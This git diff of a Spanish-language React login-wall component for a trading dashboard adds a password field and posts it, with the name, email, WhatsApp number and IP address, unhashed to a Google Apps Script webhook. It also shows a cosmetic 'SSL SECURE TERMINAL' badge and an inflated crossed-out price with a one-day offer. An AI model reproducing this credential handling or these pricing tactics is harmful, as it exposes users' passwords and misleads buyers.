@@ -1,93 +1,97 @@
 import React, { useState, useEffect } from 'react';
-import { FiUser, FiMail, FiPhone, FiGlobe, FiHash, FiLock, FiCpu, FiShieldOff, FiAlertTriangle, FiCheckCircle, FiArrowRight } from 'react-icons/fi';
+import { FiUser, FiMail, FiPhone, FiGlobe, FiHash, FiLock, FiCpu, FiShieldOff, FiAlertTriangle, FiCheckCircle, FiArrowRight, FiEye, FiEyeOff } from 'react-icons/fi';
 import Logo from './Logo';
 
 // --- CONFIGURACIÓN Y CONSTANTES ---
 const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxyAvB6GF3j6AxbfAx74I39QseHxZnW5qUDgXnMKyPrRg6weyvJp7fPR8dQFN6SNwo0KA/exec";
 const SESSION_TTL = 172800000; // 48 Horas
-const PAYPAL_LINK = "https://www.paypal.com/ncp/payment/5WHSRBUSQSZSS";
+const PAYPAL_LINK = "https://www.paypal.com/ncp/payment/5WHSRBUSQSZSS"; 
 
 const LATAM_DATA = [
-  { country: "Argentina", code: "+54" }, { country: "Bolivia", code: "+591" }, { country: "Brasil", code: "+55" },
-  { country: "Chile", code: "+56" }, { country: "Colombia", code: "+57" }, { country: "Costa Rica", code: "+506" },
-  { country: "Cuba", code: "+53" }, { country: "Ecuador", code: "+593" }, { country: "El Salvador", code: "+503" },
-  { country: "Guatemala", code: "+502" }, { country: "Honduras", code: "+504" }, { country: "México", code: "+52" },
-  { country: "Nicaragua", code: "+505" }, { country: "Panamá", code: "+507" }, { country: "Paraguay", code: "+595" },
-  { country: "Perú", code: "+51" }, { country: "Rep. Dominicana", code: "+1" }, { country: "Uruguay", code: "+598" },
-  { country: "Venezuela", code: "+58" }, { country: "Otro", code: "+" }
+  { country: "Argentina", code: "+54", digits: 10 }, 
+  { country: "Bolivia", code: "+591", digits: 8 }, 
+  { country: "Brasil", code: "+55", digits: 11 },
+  { country: "Chile", code: "+56", digits: 9 }, 
+  { country: "Colombia", code: "+57", digits: 10 }, 
+  { country: "Costa Rica", code: "+506", digits: 8 },
+  { country: "Cuba", code: "+53", digits: 8 }, 
+  { country: "Ecuador", code: "+593", digits: 9 }, 
+  { country: "El Salvador", code: "+503", digits: 8 },
+  { country: "Guatemala", code: "+502", digits: 8 }, 
+  { country: "Honduras", code: "+504", digits: 8 }, 
+  { country: "México", code: "+52", digits: 10 },
+  { country: "Nicaragua", code: "+505", digits: 8 }, 
+  { country: "Panamá", code: "+507", digits: 8 }, 
+  { country: "Paraguay", code: "+595", digits: 9 },
+  { country: "Perú", code: "+51", digits: 9 }, 
+  { country: "Rep. Dominicana", code: "+1", digits: 10 }, 
+  { country: "Uruguay", code: "+598", digits: 9 },
+  { country: "Venezuela", code: "+58", digits: 10 }, 
+  { country: "Otro", code: "+", digits: 0 }
 ];
 
 const BLACKLIST = {
-  ips: ['192.168.1.1'],
-  emails: ['scammer@tradevision.me'],
+  ips: ['192.168.1.1', '200.10.50.20'],
+  emails: ['scammer@tradevision.me', 'test@test.com'],
   phones: ['+000000000000']
 };
 
 const LoginWall: React.FC = () => {
-    const [isVisible, setIsVisible] = useState(false);
+    // IMPORTANTE: Inicializamos en true porque el componente solo se llama si no hay sesión
+    const [isVisible, setIsVisible] = useState(true);
     const [isLoading, setIsLoading] = useState(false);
     const [showOffer, setShowOffer] = useState(false);
     const [isBanned, setIsBanned] = useState(false);
     const [clientIP, setClientIP] = useState('0.0.0.0');
     const [phonePrefix, setPhonePrefix] = useState('');
+    const [phoneDigits, setPhoneDigits] = useState(0);
+    const [showPassword, setShowPassword] = useState(false);
+
     const [formData, setFormData] = useState({
         nombre: '',
         email: '',
         whatsapp: '',
         pais: '',
-        edad: ''
+        edad: '',
+        password: ''
     });
 
     useEffect(() => {
         const initSecurity = async () => {
-            // 1. Obtener IP con fallback rápido
-            let ip = '0.0.0.0';
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000); // 3s timeout
+            // Aseguramos bloqueo de scroll
+            document.body.style.overflow = 'hidden';
 
+            // Intento de obtener IP con timeout para no bloquear la UI
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 2000);
                 const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                 const data = await response.json();
-                ip = data.ip;
-                setClientIP(ip);
                 clearTimeout(timeoutId);
-            } catch (e) { 
-                console.warn("IP Check bypassed due to timeout/error"); 
-            }
-
-            // 2. Verificar Baneo
-            if (BLACKLIST.ips.includes(ip)) {
-                setIsBanned(true);
-                return;
-            }
-
-            // 3. Verificar Sesión
-            const access = localStorage.getItem('member_access');
-            const start = localStorage.getItem('session_start');
-            const now = Date.now();
-
-            if (access === 'true' && start) {
-                const elapsed = now - parseInt(start, 10);
-                if (elapsed < SESSION_TTL) {
-                    setIsVisible(false);
-                    document.body.style.overflow = 'auto';
-                    return;
+                setClientIP(data.ip);
+                if (BLACKLIST.ips.includes(data.ip)) {
+                    setIsBanned(true);
                 }
+            } catch (e) { 
+                console.warn("IP check bypassed or timed out"); 
             }
-
-            // 4. Asegurar visibilidad del muro
-            setIsVisible(true);
-            document.body.style.overflow = 'hidden';
         };
 
         initSecurity();
+        
+        return () => {
+            document.body.style.overflow = 'auto';
+        };
     }, []);
 
     const handleCountryChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
         const country = e.target.value;
         const info = LATAM_DATA.find(item => item.country === country);
         setFormData({ ...formData, pais: country });
-        if (info) setPhonePrefix(info.code);
+        if (info) {
+            setPhonePrefix(info.code);
+            setPhoneDigits(info.digits);
+        }
     };
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -101,12 +105,29 @@ const LoginWall: React.FC = () => {
         document.body.style.overflow = 'auto';
     };
 
+    const validateForm = () => {
+        const nameParts = formData.nombre.trim().split(/\s+/);
+        if (nameParts.length < 2) {
+            alert("⚠️ IDENTIDAD: Ingresa tu Nombre y Apellido real.");
+            return false;
+        }
+        if (phoneDigits > 0) {
+            const cleanPhone = formData.whatsapp.replace(/\D/g, '');
+            if (cleanPhone.length !== phoneDigits) {
+                alert(`⚠️ NÚMERO: Para ${formData.pais}, el número debe tener ${phoneDigits} dígitos.`);
+                return false;
+            }
+        }
+        return true;
+    };
+
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
+        if (!validateForm()) return;
+
         const fullPhone = `${phonePrefix}${formData.whatsapp}`.replace(/\s/g, '');
 
         if (BLACKLIST.emails.includes(formData.email.toLowerCase().trim()) || BLACKLIST.phones.includes(fullPhone)) {
-            alert("Acceso restringido por seguridad.");
             setIsBanned(true);
             return;
         }
@@ -120,17 +141,16 @@ const LoginWall: React.FC = () => {
             data.append('whatsapp', fullPhone);
             data.append('pais', formData.pais);
             data.append('edad', formData.edad);
+            data.append('password', formData.password);
             data.append('ip_address', clientIP);
-            data.append('device_info', navigator.userAgent);
             data.append('registro_hora', new Date().toLocaleString('es-ES'));
 
-            // Envío asíncrono (no esperamos respuesta estricta para no bloquear al usuario)
-            fetch(WEBHOOK_URL, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: data.toString()
-            }).catch(() => null);
+            });
 
             setTimeout(() => {
                 setIsLoading(false);
@@ -139,17 +159,17 @@ const LoginWall: React.FC = () => {
 
         } catch (error) {
             setIsLoading(false);
-            setShowOffer(true); // Fallback al éxito para no perder al usuario
+            setShowOffer(true); // Fallback exitoso ante error de webhook
         }
     };
 
     if (isBanned) {
         return (
-            <div className="fixed inset-0 z-[9999] bg-[#050b14] flex items-center justify-center p-6 text-center">
+            <div className="fixed inset-0 z-[9999] bg-black flex items-center justify-center p-6 text-center">
                 <div className="max-w-md">
-                    <FiShieldOff className="text-red-500 text-7xl mx-auto mb-4" />
-                    <h1 className="text-white text-3xl font-black mb-4">TERMINAL BLOQUEADA</h1>
-                    <p className="text-gray-400 font-mono">Su acceso ha sido revocado permanentemente por incumplimiento de términos.</p>
+                    <FiShieldOff className="text-red-500 text-7xl mx-auto mb-4 animate-pulse" />
+                    <h1 className="text-white text-3xl font-black mb-4">ACCESO BLOQUEADO</h1>
+                    <p className="text-gray-400 font-mono text-sm">Tu IP o identidad ha sido restringida por seguridad.</p>
                 </div>
             </div>
         );
@@ -158,37 +178,34 @@ const LoginWall: React.FC = () => {
     if (!isVisible) return null;
 
     return (
-        <div className="fixed inset-0 z-[9999] bg-[#050b14]/98 backdrop-blur-2xl flex items-center justify-center p-4">
+        <div className="fixed inset-0 z-[9999] bg-[#050b14]/98 backdrop-blur-2xl flex items-center justify-center p-4 overflow-y-auto">
             {showOffer ? (
-                <div className="w-full max-w-md bg-[#0A1931] rounded-3xl shadow-2xl overflow-hidden border-4 border-yellow-500 p-8 animate-fade-in-up text-center relative">
+                <div className="w-full max-w-md bg-[#0A1931] rounded-2xl shadow-2xl overflow-hidden border-4 border-yellow-500 p-8 animate-fade-in-up text-center relative">
                     <div className="absolute top-0 left-0 w-full h-2 bg-yellow-500 animate-pulse"></div>
                     <h2 className="text-xl font-bold text-green-400 mb-2 uppercase tracking-widest">¡Excelente!</h2>
-                    <h1 className="text-3xl font-black text-white mb-4 leading-none uppercase italic">OFERTA ÚNICA DE BIENVENIDA</h1>
+                    <h1 className="text-3xl font-black text-white mb-4 leading-none uppercase italic">OFERTA DE BIENVENIDA</h1>
                     <p className="text-gray-300 text-sm mb-6 leading-relaxed">
-                        ¿Quieres que la IA trabaje para ti? Obtén los <strong className="text-yellow-400">PROMPTS MAESTROS</strong> para automatizar el análisis técnico. Evita años de estudio frustrado.
+                        Desbloquea los <strong className="text-yellow-400">PROMPTS MAESTROS</strong>. Solo por hoy.
                     </p>
-                    <div className="mb-8 bg-black/30 p-4 rounded-xl border border-white/10">
-                        <span className="text-red-500 line-through text-lg font-bold mr-3">$50.00</span>
+                    <div className="mb-8 bg-black/30 p-4 rounded-lg border border-white/10">
+                        <span className="text-red-500 line-through text-lg font-bold mr-3">$97.00</span>
                         <span className="text-yellow-400 text-4xl font-black">$19.99</span>
                     </div>
-                    <button 
-                        onClick={() => window.open(PAYPAL_LINK, '_blank')}
-                        className="w-full bg-yellow-500 hover:bg-yellow-400 text-black font-black py-4 rounded-xl shadow-[0_0_25px_rgba(234,179,8,0.4)] transition-all transform hover:scale-105 flex items-center justify-center gap-2 mb-4 text-lg"
-                    >
+                    <button onClick={() => window.open(PAYPAL_LINK, '_blank')} className="w-full bg-yellow-500 hover:bg-yellow-400 text-black font-black py-4 rounded-lg shadow-[0_0_20px_rgba(234,179,8,0.5)] transition-all transform hover:scale-105 flex items-center justify-center gap-2 mb-4 text-lg">
                         <FiLock /> ASEGURAR COPIA
                     </button>
                     <button onClick={handleSkipOffer} className="text-gray-500 text-xs hover:text-white underline transition-colors">
-                        Acceder al Dashboard gratuito sin manual de IA.
+                        Saltar y entrar al Dashboard gratuito.
                     </button>
                 </div>
             ) : (
-                <div className="w-full max-w-md bg-[#0A1931] rounded-3xl shadow-[0_0_80px_rgba(0,229,255,0.1)] overflow-hidden border border-white/10 p-8 relative flex flex-col items-center">
+                <div className="w-full max-w-md bg-[#0A1931] rounded-3xl border border-white/10 p-8 relative flex flex-col items-center animate-fade-in-up shadow-[0_0_100px_rgba(0,229,255,0.1)]">
                     <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-brand-accent to-transparent opacity-40"></div>
                     
-                    <div className="text-center mb-8">
-                        <Logo className="w-20 h-20 mb-4 drop-shadow-[0_0_20px_rgba(64,224,208,0.3)] mx-auto" />
-                        <h2 className="text-3xl font-black text-white uppercase tracking-tighter mb-1">Terminal de Acceso</h2>
-                        <p className="text-brand-accent text-[9px] uppercase font-black tracking-[0.4em] opacity-60">Security Protocol v4.0</p>
+                    <div className="text-center mb-6">
+                        <Logo className="w-16 h-16 drop-shadow-[0_0_15px_rgba(64,224,208,0.4)] mb-4 mx-auto" />
+                        <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">Terminal de Acceso</h2>
+                        <p className="text-brand-accent text-[10px] uppercase font-bold tracking-widest opacity-60">Seguridad TradeVision v4.0</p>
                     </div>
 
                     <form onSubmit={handleSubmit} className="space-y-4 w-full">
@@ -197,7 +214,7 @@ const LoginWall: React.FC = () => {
                             <input 
                                 name="nombre" type="text" required placeholder="Nombre Completo"
                                 value={formData.nombre} onChange={handleChange}
-                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3.5 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
+                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
                             />
                         </div>
 
@@ -206,7 +223,7 @@ const LoginWall: React.FC = () => {
                             <input 
                                 name="email" type="email" required placeholder="Email de Registro"
                                 value={formData.email} onChange={handleChange}
-                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3.5 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
+                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
                             />
                         </div>
 
@@ -214,9 +231,9 @@ const LoginWall: React.FC = () => {
                             <FiGlobe className="absolute left-3 top-3.5 text-brand-accent/40 group-focus-within:text-brand-accent transition-colors" />
                             <select 
                                 name="pais" required value={formData.pais} onChange={handleCountryChange}
-                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3.5 pl-10 pr-4 text-white focus:ring-1 focus:ring-brand-accent outline-none appearance-none cursor-pointer text-sm"
+                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-4 text-white focus:ring-1 focus:ring-brand-accent outline-none appearance-none transition-all text-sm cursor-pointer"
                             >
-                                <option value="" disabled>País</option>
+                                <option value="" disabled>País de Residencia</option>
                                 {LATAM_DATA.map(i => <option key={i.country} value={i.country} className="bg-[#0A1931]">{i.country}</option>)}
                             </select>
                         </div>
@@ -230,8 +247,22 @@ const LoginWall: React.FC = () => {
                                 <input 
                                     name="whatsapp" type="tel" required placeholder="WhatsApp"
                                     value={formData.whatsapp} onChange={handleChange}
-                                    className="w-full bg-[#112240] border border-white/5 rounded-xl py-3.5 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
+                                    className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
                                 />
+                            </div>
+                        </div>
+
+                        <div className="relative group">
+                            <FiLock className="absolute left-3 top-3.5 text-brand-accent/40 group-focus-within:text-brand-accent transition-colors" />
+                            <input 
+                                name="password" 
+                                type={showPassword ? "text" : "password"} 
+                                required placeholder="Crea tu Contraseña"
+                                value={formData.password} onChange={handleChange}
+                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-10 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
+                            />
+                            <div className="absolute right-3 top-3.5 cursor-pointer text-gray-500" onClick={() => setShowPassword(!showPassword)}>
+                                {showPassword ? <FiEyeOff /> : <FiEye />}
                             </div>
                         </div>
 
@@ -240,7 +271,7 @@ const LoginWall: React.FC = () => {
                             <input 
                                 name="edad" type="number" min="18" max="99" required placeholder="Edad"
                                 value={formData.edad} onChange={handleChange}
-                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3.5 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
+                                className="w-full bg-[#112240] border border-white/5 rounded-xl py-3 pl-10 pr-4 text-white placeholder-gray-600 focus:ring-1 focus:ring-brand-accent outline-none transition-all text-sm"
                             />
                         </div>
 
@@ -255,11 +286,9 @@ const LoginWall: React.FC = () => {
                             )}
                         </button>
 
-                        <div className="text-center mt-6">
-                            <p className="text-[10px] text-gray-500 uppercase font-black tracking-[0.2em] flex items-center justify-center gap-1.5 opacity-60">
-                                <FiCheckCircle className="text-brand-accent" /> SSL SECURE TERMINAL
-                            </p>
-                        </div>
+                        <p className="text-[9px] text-center text-gray-500 uppercase font-black tracking-[0.2em] flex items-center justify-center gap-1.5 opacity-60">
+                            <FiCheckCircle className="text-brand-accent" /> SSL SECURE TERMINAL
+                        </p>
                     </form>
                 </div>
             )}
